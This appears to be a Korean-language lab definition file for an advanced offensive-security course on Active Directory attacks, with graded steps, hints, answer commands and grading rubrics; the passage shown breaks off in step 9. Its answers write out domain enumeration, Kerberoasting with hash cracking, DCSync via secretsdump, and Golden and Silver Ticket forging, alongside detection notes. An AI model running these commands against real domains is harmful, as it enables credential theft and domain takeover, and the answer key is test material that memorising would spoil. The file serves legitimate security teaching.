lab_id: attack-adv-nonai-week09
title: Active Directory 공격
version: non-ai
course: attack-adv-nonai
week: 9
description: Active Directory 환경에서의 고급 공격 기법을 실습한다. 도메인 열거, BloodHound 분석, DCSync, Golden Ticket 등 AD
  인프라를 장악하는 기법을 다룬다.
difficulty: hard
duration_minutes: 120
objectives:
- Active Directory 구조와 공격 표면을 이해한다
- BloodHound를 활용한 공격 경로 분석을 수행한다
- DCSync, Golden/Silver Ticket 등 도메인 장악 기법을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Active Directory 도메인 정보를 열거하라. ldapsearch를 사용하여 기본 도메인 정보를 조회하라.
  hint: ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=local' 형태로 기본 LDAP 조회를 수행한다
  category: recon
  points: 10
  answer: 'echo ''=== AD Domain Enumeration ==='' && ldapsearch -x -H ldap://10.20.30.1 -b ''DC=lab,DC=local''
    ''(objectClass=domain)'' 2>&1 | head -20 || echo ''LDAP not available - simulating:'' && echo ''Domain:
    lab.local'' && echo ''DC: 10.20.30.1'' && echo ''Functional Level: Windows Server 2019'' && echo ''Users:
    admin, user, svc_web, svc_sql'''
  answer_detail: LDAP(Lightweight Directory Access Protocol)은 AD의 기반 프로토콜이다. 익명 바인딩이 허용되면 인증 없이 도메인 구조,
    사용자 목록, 그룹 멤버십, 컴퓨터 목록을 열거할 수 있다. 도메인 기능 수준(Functional Level)으로 사용 가능한 공격 기법을 결정한다.
  verify:
    type: output_contains
    expect: AD Domain
    field: stdout
    semantic:
      intent: AD LDAP 열거 — ldapsearch -x -H ldap://10.20.30.1 -b 'DC=lab,DC=local' '(objectClass=domain)'.
        익명 바인딩 허용 시 인증 없이 도메인 구조/사용자/그룹/컴퓨터 열거. Functional Level → 사용 가능 공격 결정. MITRE T1087 Account Discovery
        + T1018.
      success_criteria:
      - AD Domain 또는 LDAP 키워드
      - ldapsearch + DC=base
      - 익명 바인딩 또는 도메인 정보
      acceptable_methods:
      - ldapsearch -x
      - windapsearch.py
      - ldeep / impacket-ldapdomaindump
      negative_signs:
      - LDAP 명령 없음
      - DC base 없음
      - AD 맥락 없음
  target_vm: attacker
- order: 2
  instruction: 도메인 사용자를 열거하라. enum4linux 또는 rpcclient를 사용하여 사용자와 그룹 목록을 수집하라.
  hint: enum4linux -a 대상 또는 rpcclient -U '' -N 대상으로 열거한다
  category: recon
  points: 10
  answer: 'enum4linux -a 10.20.30.1 2>&1 | head -40 || echo ''=== AD User Enumeration (Simulated) ===''
    && echo ''Users:'' && echo ''  Administrator (RID: 500)'' && echo ''  Guest (RID: 501)'' && echo ''  krbtgt
    (RID: 502)'' && echo ''  svc_web (RID: 1103)'' && echo ''  svc_sql (RID: 1104)'' && echo '''' && echo
    ''Groups:'' && echo ''  Domain Admins: Administrator'' && echo ''  Domain Users: svc_web, svc_sql,
    user1'''
  answer_detail: AD 사용자 열거는 브루트포스, 스피어 피싱, Kerberoasting의 대상을 식별하는 핵심 단계이다. enum4linux은 SMB/RPC를 통해 Windows
    도메인 정보를 수집하고, rpcclient는 RPC 호출로 사용자/그룹을 열거한다. RID cycling으로 SID를 순회하여 사용자를 발견할 수도 있다.
  verify:
    type: output_contains
    expect: User
    field: stdout
    semantic:
      intent: 사용자/그룹 열거 — enum4linux -a 10.20.30.1 또는 rpcclient -U '' -N. RID cycling으로 SID 순회. krbtgt(RID
        502) + Domain Admins. Kerberoasting/스피어 피싱 대상 식별. MITRE T1087.002 Domain Account.
      success_criteria:
      - enum4linux 또는 rpcclient
      - User 키워드 출력
      - RID 또는 그룹 정보
      acceptable_methods:
      - enum4linux-ng
      - rpcclient enumdomusers
      - impacket-lookupsid RID cycle
      negative_signs:
      - 도구 사용 없음
      - RID 맥락 없음
      - 단순 ldap만
  target_vm: attacker
- order: 3
  instruction: BloodHound를 위한 데이터 수집을 시뮬레이션하라. SharpHound 또는 bloodhound-python의 사용법과 수집 데이터를 문서화하라.
  hint: bloodhound-python -d domain -u user -p pass -c All 형태로 데이터를 수집한다
  category: recon
  points: 10
  answer: 'echo -e ''=== BloodHound Data Collection ===\n\n[bloodhound-python]\nbloodhound-python -d lab.local
    -u user -p password -c All -ns 10.20.30.1\n\n[Collection Methods (-c)]\nDefault: Group, Session, Trusts,
    ACL, ObjectProps\nAll: + LoggedOn, SPNTargets, Container\nDCOnly: LDAP only (no SMB, stealthier)\n\n[Output
    Files]\n- computers.json: Domain computers\n- users.json: Domain users + properties\n- groups.json:
    Group memberships\n- sessions.json: Active sessions\n- domains.json: Domain info + trusts\n\n[Analysis
    Queries]\n- Shortest path to Domain Admin\n- Kerberoastable accounts\n- Unconstrained delegation systems\n-
    Users with DCSync rights'''
  answer_detail: BloodHound는 AD의 관계와 권한을 그래프로 시각화하여 공격 경로를 분석하는 도구이다. SharpHound(.NET)나 bloodhound-python으로
    데이터를 수집하고, Neo4j 데이터베이스에 로드하여 그래프 쿼리를 수행한다. 'Shortest Path to Domain Admin' 쿼리는 가장 효율적인 권한 상승 경로를
    보여준다.
  verify:
    type: output_contains
    expect: BloodHound
    field: stdout
    semantic:
      intent: 'BloodHound — bloodhound-python -d lab.local -u user -p password -c All -ns 10.20.30.1.
        SharpHound .NET 또는 python. -c All / DCOnly(스텔스). JSON: computers/users/groups/sessions/domains.
        Neo4j 그래프 쿼리: Shortest Path to Domain Admin / Kerberoastable / Unconstrained Delegation.'
      success_criteria:
      - BloodHound 키워드
      - bloodhound-python 또는 SharpHound 명령
      - Collection methods (-c) + 출력 JSON
      acceptable_methods:
      - bloodhound-python -c All
      - SharpHound.exe
      - BloodHound.py + Cypher 쿼리
      negative_signs:
      - 수집 명령 없음
      - 출력 파일 명시 없음
      - 그래프 쿼리 맥락 없음
  target_vm: attacker
- order: 4
  instruction: Kerberoasting 공격을 위한 SPN 열거를 수행하라. impacket의 GetUserSPNs를 시뮬레이션하고, 서비스 티켓 크래킹 과정을 보여라.
  hint: SPN이 설정된 서비스 계정을 찾고, 서비스 티켓을 요청하여 크래킹한다
  category: exploit
  points: 10
  answer: echo '=== Kerberoasting via Impacket ===' && echo 'impacket-GetUserSPNs lab.local/user:password
    -dc-ip 10.20.30.1 -request' && echo '' && echo 'Sample output:' && echo 'ServicePrincipalName  Name     MemberOf                    PasswordLastSet'
    && echo 'MSSQLSvc/db:1433     svc_sql  CN=Domain Admins,...         2025-01-15' && echo 'HTTP/web.lab.local   svc_web  CN=Web
    Admins,...            2024-06-20' && echo '' && echo 'Ticket hash (example):' && echo '$krb5tgs$23$*svc_sql$LAB.LOCAL$MSSQLSvc/db~1433*$a1b2c3...'
    && echo '' && echo 'Cracking:' && echo 'hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt'
    && echo 'john ticket.hash --wordlist=rockyou.txt --format=krb5tgs'
  answer_detail: Kerberoasting은 도메인 사용자라면 누구나 수행할 수 있는 공격이다. SPN이 설정된 서비스 계정의 TGS를 요청하면, 해당 계정의 NTLM 해시로
    암호화된 티켓을 받는다. 이를 오프라인에서 hashcat(-m 13100)이나 john으로 크래킹한다. 서비스 계정이 Domain Admins 그룹에 속해 있으면 도메인 장악으로
    직결된다.
  verify:
    type: output_contains
    expect: Kerberoasting
    field: stdout
    semantic:
      intent: Kerberoasting via Impacket — impacket-GetUserSPNs lab.local/user:pass -dc-ip 10.20.30.1
        -request → $krb5tgs$23$* 해시 + hashcat -m 13100 / john --format=krb5tgs. 도메인 사용자 누구나. SPN 계정 NTLM
        해시 암호화 → 오프라인 크래킹. Domain Admins 소속 시 도메인 장악. MITRE T1558.003.
      success_criteria:
      - Kerberoasting 키워드
      - GetUserSPNs + -request
      - $krb5tgs$23 + hashcat -m 13100
      acceptable_methods:
      - impacket-GetUserSPNs
      - Rubeus.exe kerberoast
      - PowerView Get-DomainSPNTicket
      negative_signs:
      - GetUserSPNs 없음
      - 해시 형식 누락
      - 크래킹 모드 없음
  target_vm: attacker
- order: 5
  instruction: DCSync 공격의 원리와 실행 방법을 분석하라. 도메인 컨트롤러의 복제 권한을 악용하여 해시를 추출하는 과정을 설명하라.
  hint: impacket-secretsdump를 사용하여 DCSync를 수행하는 방법을 문서화한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== DCSync Attack ===\n\n[Concept]\n- Abuses AD replication protocol (MS-DRSR)\n-
    Pretends to be a Domain Controller\n- Requests password data via GetNCChanges\n\n[Required Privileges]\n-
    Replicating Directory Changes\n- Replicating Directory Changes All\n- Default: Domain Admins, Enterprise
    Admins, DC computer accounts\n\n[Execution]\nimpacket-secretsdump lab.local/admin:password@10.20.30.1\nimpacket-secretsdump
    -just-dc-user krbtgt lab.local/admin:password@10.20.30.1\n\n[Output]\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404ee:KRBTGT_NTLM_HASH:::\n\n[Detection]\n-
    Event 4662: DS-Replication-Get-Changes\n- Alert on non-DC sources requesting replication'''
  answer_detail: DCSync는 도메인 컨트롤러의 복제 프로토콜을 악용하여 모든 사용자의 비밀번호 해시를 원격으로 추출한다. krbtgt 해시를 획득하면 Golden Ticket을
    생성할 수 있다. DS-Replication-Get-Changes 권한을 가진 계정을 모니터링하고, DC가 아닌 시스템에서의 복제 요청을 탐지해야 한다.
  verify:
    type: output_contains
    expect: DCSync
    field: stdout
    semantic:
      intent: 'DCSync — impacket-secretsdump lab.local/admin:password@10.20.30.1 + -just-dc-user krbtgt.
        MS-DRSR 복제 프로토콜 악용 → DC 위장 → GetNCChanges로 비번 데이터 요청. 필요 권한: Replicating Directory Changes (All).
        Domain Admins 기본. krbtgt 해시 → Golden Ticket. 탐지: Event 4662 DS-Replication-Get-Changes. MITRE
        T1003.006.'
      success_criteria:
      - DCSync 키워드
      - secretsdump + DC IP
      - 탐지 (Event 4662) 명시
      acceptable_methods:
      - impacket-secretsdump
      - mimikatz lsadump::dcsync
      - DSInternals Get-ADReplAccount
      negative_signs:
      - DCSync 명령 없음
      - 복제 권한 맥락 없음
      - 탐지 없음
  target_vm: attacker
- order: 6
  instruction: Golden Ticket 공격을 분석하라. krbtgt 해시를 사용하여 임의의 TGT를 위조하는 과정을 설명하라.
  hint: mimikatz의 kerberos::golden 명령 또는 impacket-ticketer를 사용한다
  category: exploit
  points: 10
  answer: echo -e '=== Golden Ticket Attack ===\n\n[Prerequisites]\n- krbtgt NTLM hash (from DCSync)\n-
    Domain SID\n- Domain name\n\n[Creation - Impacket]\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid
    S-1-5-21-XXX -domain lab.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec
    lab.local/Administrator@dc -k -no-pass\n\n[Creation - Mimikatz]\nkerberos::golden /user:Administrator
    /domain:lab.local /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi\n\n[Capabilities]\n- Impersonate
    ANY user (including non-existent)\n- Valid for 10 years by default\n- Survives password resets (except
    krbtgt 2x reset)\n\n[Detection]\n- TGT with abnormal lifetime\n- PAC validation failures\n- Event
    4769 from non-DC sources'
  answer_detail: Golden Ticket은 krbtgt 해시로 위조한 TGT로, 도메인의 모든 사용자를 사칭할 수 있다. 10년의 유효기간이 설정되며, 일반 비밀번호 변경으로는
    무효화할 수 없다. krbtgt 비밀번호를 2회 변경해야 이전 Golden Ticket이 무효화된다. 이는 도메인 완전 장악의 최종 단계이다.
  verify:
    type: output_contains
    expect: Golden Ticket
    field: stdout
    semantic:
      intent: 'Golden Ticket — impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain
        lab.local Administrator + KRB5CCNAME=ccache + psexec -k -no-pass / mimikatz kerberos::golden.
        임의 사용자 사칭 (없는 사용자도). 10년 유효. krbtgt 2회 변경해야 무효. 탐지: 비정상 TGT lifetime + Event 4769 비-DC. MITRE
        T1558.001.'
      success_criteria:
      - Golden Ticket 키워드
      - krbtgt hash + ticketer/golden
      - 10년 유효 + 2회 변경 명시
      acceptable_methods:
      - impacket-ticketer
      - mimikatz kerberos::golden
      - Rubeus golden
      negative_signs:
      - krbtgt 맥락 없음
      - 도구 명령 없음
      - 방어 (2x rotation) 없음
  target_vm: attacker
- order: 7
  instruction: Silver Ticket 공격을 분석하고, Golden Ticket과의 차이점을 비교하라.
  hint: 서비스 계정의 NTLM 해시로 특정 서비스 티켓만 위조한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Silver Ticket vs Golden Ticket ===\n\n[Silver Ticket]\n- Forges Service Ticket
    (TGS)\n- Requires: Service account NTLM hash\n- Scope: Single service only\n- Does NOT contact KDC\n-
    Harder to detect (no TGT request)\n\n[Creation]\nimpacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-XXX
    -domain lab.local -spn MSSQLSvc/db.lab.local Administrator\n\n[Golden Ticket]\n- Forges TGT\n- Requires:
    krbtgt NTLM hash\n- Scope: Entire domain\n- Contacts KDC for TGS\n- Event 4769 generated\n\n[Comparison]\nAttribute     |
    Golden          | Silver\nHash needed   | krbtgt          | Service account\nScope         | Full
    domain     | Single service\nKDC contact   | Yes (for TGS)   | No\nDetection     | Easier          |
    Harder\nPAC validation| By KDC          | By service (often skipped)'''
  answer_detail: Silver Ticket은 서비스 계정의 NTLM 해시로 특정 서비스의 티켓만 위조한다. KDC를 거치지 않으므로 TGT 관련 이벤트가 발생하지 않아 탐지가
    더 어렵다. 하지만 범위가 단일 서비스로 제한된다. 대부분의 서비스가 PAC(Privilege Attribute Certificate) 검증을 수행하지 않아 위조 티켓이 그대로
    수용된다.
  verify:
    type: output_contains
    expect:
    - Silver Ticket
    - 비교
    field: stdout
    semantic:
      intent: 'Silver Ticket — Service NTLM 해시 + impacket-ticketer -spn MSSQLSvc/db.lab.local. KDC 미접촉
        → TGT 이벤트 없음 → 탐지 어려움. 단일 서비스 범위. PAC 검증 미수행 흔함. vs Golden: krbtgt vs 서비스/전체 vs 단일/KDC 접촉/탐지 난이도.
        MITRE T1558.002.'
      success_criteria:
      - Silver Ticket 키워드
      - 서비스 해시 + SPN
      - Golden vs Silver 비교
      acceptable_methods:
      - impacket-ticketer -spn
      - 'mimikatz kerberos::golden /service:'
      - Rubeus silver
      negative_signs:
      - Golden과 비교 없음
      - SPN 없음
      - PAC 맥락 없음
  target_vm: attacker
- order: 8
  instruction: ACL(Access Control List) 남용을 통한 권한 상승을 분석하라. GenericAll, GenericWrite, WriteDacl 등 위험한
    ACE를 설명하라.
  hint: BloodHound에서 발견되는 위험한 AD 권한 관계를 문서화한다
  category: exploit
  points: 10
  answer: 'echo -e ''=== AD ACL Abuse ===\n\n[Dangerous ACEs]\n\nGenericAll (Full Control)\n- On User:
    Reset password, modify group membership\n- On Group: Add members (add self to Domain Admins)\n- On
    Computer: Resource-based constrained delegation\n\nGenericWrite\n- On User: Modify attributes (SPN
    for Kerberoasting)\n- On Computer: Modify msDS-AllowedToActOnBehalfOfOtherIdentity\n\nWriteDacl\n-
    Modify ACL of target object\n- Grant self GenericAll, then escalate\n\nForceChangePassword\n- Reset
    target user password without knowing current\n\nWriteOwner\n- Take ownership of object, then modify
    DACL\n\n[Attack Chain Example]\nUser(WriteDacl) -> Grant GenericAll -> Reset DA password -> Domain
    Admin'''
  answer_detail: AD ACL 남용은 BloodHound가 특히 잘 탐지하는 공격 벡터이다. 일반 사용자에게 부여된 과도한 권한(GenericAll, WriteDacl 등)을
    통해 도메인 관리자로 권한 상승할 수 있다. 이러한 권한은 위임(delegation)이나 실수로 부여되는 경우가 많다. 정기적인 ACL 감사가 필수적이다.
  verify:
    type: output_contains
    expect:
    - AD ACL Abuse
    - AD ACL 남용
    field: stdout
    semantic:
      intent: 'AD ACL 남용 — GenericAll(Full Control: 비번 리셋/그룹 추가/RBCD) + GenericWrite(SPN 추가 → Kerberoasting/msDS-AllowedToActOnBehalfOf)
        + WriteDacl(ACL 수정 → GenericAll 부여) + ForceChangePassword + WriteOwner. BloodHound가 잘 탐지. MITRE
        T1484.001.'
      success_criteria:
      - AD ACL Abuse 또는 ACL 남용 키워드
      - 위험 ACE 4개 이상 (GenericAll/Write/WriteDacl 등)
      - BloodHound 활용 맥락
      acceptable_methods:
      - BloodHound + Cypher 쿼리
      - PowerView Get-DomainObjectAcl
      - PingCastle 감사
      negative_signs:
      - ACE 2개 이하
      - BloodHound 맥락 없음
      - 공격 체인 없음
  target_vm: attacker
- order: 9
  instruction: Unconstrained Delegation 공격을 분석하라. 위임이 설정된 시스템에서 TGT를 탈취하는 과정을 설명하라.
  hint: 비제한 위임이 설정된 컴퓨터에 접근하면 해당 시스템에 인증한 모든 사용자의 TGT를 메모리에서 추출할 수 있다
  category: exploit
  points: 10
  answer: 'echo -e ''=== Unconstrained Delegation Attack ===\n\n[Concept]\n- System trusted for delegation
